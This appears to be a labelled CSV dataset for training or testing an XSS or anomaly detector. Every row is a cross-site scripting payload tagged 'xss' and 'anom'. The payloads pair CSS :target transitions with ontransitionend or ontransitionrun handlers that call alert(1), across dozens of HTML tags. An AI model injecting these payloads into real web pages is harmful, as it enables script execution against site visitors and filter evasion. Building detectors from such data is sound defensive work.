payload,length,attack_type,label
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",106,xss,anom
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>",100,xss,anom
"<style>:target {color:red;}</style><iframe id=x style=""transition:color 1s"" ontransitionend=alert(1)></iframe>",110,xss,anom
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",108,xss,anom
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionend=alert(1)></img>",104,xss,anom
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionend=alert(1)></input>",108,xss,anom
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",104,xss,anom
"<style>:target {color:red;}</style><isindex id=x style=""transition:color 1s"" ontransitionend=alert(1)></isindex>",112,xss,anom
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionend=alert(1)></kbd>",104,xss,anom
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",110,xss,anom
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionend=alert(1)></label>",108,xss,anom
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" ontransitionend=alert(1)></legend>",110,xss,anom
"<style>:target {color:red;}</style><li id=x style=""transition:color 1s"" ontransitionend=alert(1)></li>",102,xss,anom
"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionend=alert(1)></link>",106,xss,anom
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",112,xss,anom
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",106,xss,anom
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",104,xss,anom
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",106,xss,anom
"<style>:target {color:red;}</style><marquee id=x style=""transition:color 1s"" ontransitionend=alert(1)></marquee>",112,xss,anom
"<style>:target {color:red;}</style><menu id=x style=""transition:color 1s"" ontransitionend=alert(1)></menu>",106,xss,anom
"<style>:target {color:red;}</style><menuitem id=x style=""transition:color 1s"" ontransitionend=alert(1)></menuitem>",114,xss,anom
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",106,xss,anom
"<style>:target {color:red;}</style><meter id=x style=""transition:color 1s"" ontransitionend=alert(1)></meter>",108,xss,anom
"<style>:target {color:red;}</style><multicol id=x style=""transition:color 1s"" ontransitionend=alert(1)></multicol>",114,xss,anom
"<style>:target {color:red;}</style><nav id=x style=""transition:color 1s"" ontransitionend=alert(1)></nav>",104,xss,anom
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",110,xss,anom
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionend=alert(1)></nobr>",106,xss,anom
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionend=alert(1)></noembed>",112,xss,anom
"<style>:target {color:red;}</style><noframes id=x style=""transition:color 1s"" ontransitionend=alert(1)></noframes>",114,xss,anom
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>",114,xss,anom
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",110,xss,anom
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>",102,xss,anom
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",114,xss,anom
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",110,xss,anom
"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" ontransitionend=alert(1)></output>",110,xss,anom
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",100,xss,anom
"<style>:target {color:red;}</style><param id=x style=""transition:color 1s"" ontransitionend=alert(1)></param>",108,xss,anom
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",112,xss,anom
"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",116,xss,anom
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",104,xss,anom
"<style>:target {color:red;}</style><progress id=x style=""transition:color 1s"" ontransitionend=alert(1)></progress>",114,xss,anom
"<style>:target {color:red;}</style><q id=x style=""transition:color 1s"" ontransitionend=alert(1)></q>",100,xss,anom
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionend=alert(1)></rb>",102,xss,anom
"<style>:target {color:red;}</style><rp id=x style=""transition:color 1s"" ontransitionend=alert(1)></rp>",102,xss,anom
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",102,xss,anom
"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>",104,xss,anom
"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" ontransitionend=alert(1)></ruby>",106,xss,anom
"<style>:target {color:red;}</style><s id=x style=""transition:color 1s"" ontransitionend=alert(1)></s>",100,xss,anom
"<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" ontransitionend=alert(1)></samp>",106,xss,anom
"<style>:target {color:red;}</style><script id=x style=""transition:color 1s"" ontransitionend=alert(1)></script>",110,xss,anom
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",112,xss,anom
"<style>:target {color:red;}</style><select id=x style=""transition:color 1s"" ontransitionend=alert(1)></select>",110,xss,anom
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",110,xss,anom
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",106,xss,anom
"<style>:target {color:red;}</style><small id=x style=""transition:color 1s"" ontransitionend=alert(1)></small>",108,xss,anom
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" ontransitionend=alert(1)></source>",110,xss,anom
"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",110,xss,anom
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",106,xss,anom
"<style>:target {color:red;}</style><strike id=x style=""transition:color 1s"" ontransitionend=alert(1)></strike>",110,xss,anom
"<style>:target {color:red;}</style><strong id=x style=""transition:color 1s"" ontransitionend=alert(1)></strong>",110,xss,anom
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>",108,xss,anom
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" ontransitionend=alert(1)></sub>",104,xss,anom
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",112,xss,anom
"<style>:target {color:red;}</style><sup id=x style=""transition:color 1s"" ontransitionend=alert(1)></sup>",104,xss,anom
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" ontransitionend=alert(1)></svg>",104,xss,anom
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",108,xss,anom
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",108,xss,anom
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionend=alert(1)></td>",102,xss,anom
"<style>:target {color:red;}</style><template id=x style=""transition:color 1s"" ontransitionend=alert(1)></template>",114,xss,anom
"<style>:target {color:red;}</style><textarea id=x style=""transition:color 1s"" ontransitionend=alert(1)></textarea>",114,xss,anom
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionend=alert(1)></tfoot>",108,xss,anom
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",102,xss,anom
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionend=alert(1)></thead>",108,xss,anom
"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>",106,xss,anom
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",108,xss,anom
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",102,xss,anom
"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>",108,xss,anom
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",102,xss,anom
"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",100,xss,anom
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" ontransitionend=alert(1)></ul>",102,xss,anom
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",104,xss,anom
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",108,xss,anom
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",104,xss,anom
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",104,xss,anom
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></a>",120,xss,anom
"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></abbr>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></acronym>",132,xss,anom
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",132,xss,anom
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",130,xss,anom
"<style>:target {transform: rotate(180deg);}</style><area id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></area>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><article id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></article>",132,xss,anom
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></aside>",128,xss,anom
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",128,xss,anom
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",120,xss,anom
"<style>:target {transform: rotate(180deg);}</style><base id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></base>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><basefont id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></basefont>",134,xss,anom
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>",124,xss,anom
"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdo>",124,xss,anom
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",132,xss,anom
"<style>:target {transform: rotate(180deg);}</style><big id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></big>",124,xss,anom
"<style>:target {transform: rotate(180deg);}</style><blink id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blink>",128,xss,anom
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",138,xss,anom
"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></br>",122,xss,anom
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",130,xss,anom
"<style>:target {transform: rotate(180deg);}</style><canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></canvas>",130,xss,anom
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",132,xss,anom
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></center>",130,xss,anom
"<style>:target {transform: rotate(180deg);}</style><cite id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></cite>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",126,xss,anom
"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></col>",124,xss,anom
"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>",134,xss,anom
"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></command>",132,xss,anom
